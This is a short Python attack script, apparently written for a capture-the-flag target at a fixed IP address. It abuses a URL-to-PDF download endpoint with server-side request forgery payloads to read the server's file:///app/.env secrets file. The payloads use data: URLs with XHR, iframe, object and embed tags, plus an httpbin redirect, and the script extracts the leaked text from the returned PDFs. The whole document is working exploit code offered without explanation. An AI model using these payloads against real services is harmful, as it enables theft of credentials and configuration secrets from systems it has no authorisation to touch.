import io, urllib.parse, urllib.request, urllib.error
from pypdf import PdfReader

base = "http://154.57.164.68:31206"


def http(url, data=None, timeout=70):
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def pdf_text(blob: bytes) -> str:
    if not blob.startswith(b"%PDF"):
        return blob.decode("utf-8", "replace")[:400]
    try:
        r = PdfReader(io.BytesIO(blob))
        return "\n".join((p.extract_text() or "") for p in r.pages)[:800]
    except Exception as e:
        return f"pdf-err {e} utf16={blob.find(b's\\x00e\\x00c')}"


_, tok = http(base + "/getToken")
user = tok.decode().strip()

htmls = {
    "xhr": "data:text/html,<script>var x=new XMLHttpRequest();x.open('GET','file:///app/.env',false);try{x.send();document.write('<pre>'+x.responseText+'</pre>');}catch(e){document.write(e);}</script>",
    "iframe": "data:text/html,<iframe src='file:///app/.env' width=900 height=900></iframe>",
    "object": "data:text/html,<object data='file:///app/.env' type='text/plain' width=900 height=900></object>",
    "embed": "data:text/html,<embed src='file:///app/.env' width=900 height=900>",
    "httpbin": "https://httpbin.org/redirect-to?url=file:///app/.env",
}

for name, u in htmls.items():
    st, body = http(
        f"{base}/download?token={urllib.parse.quote(user)}",
        urllib.parse.urlencode({"url": u}).encode(),
        timeout=80,
    )
    text = pdf_text(body)
    print(f"Q: {name}? |+ status={st} len={len(body)} text={text[:220]!r} | -")
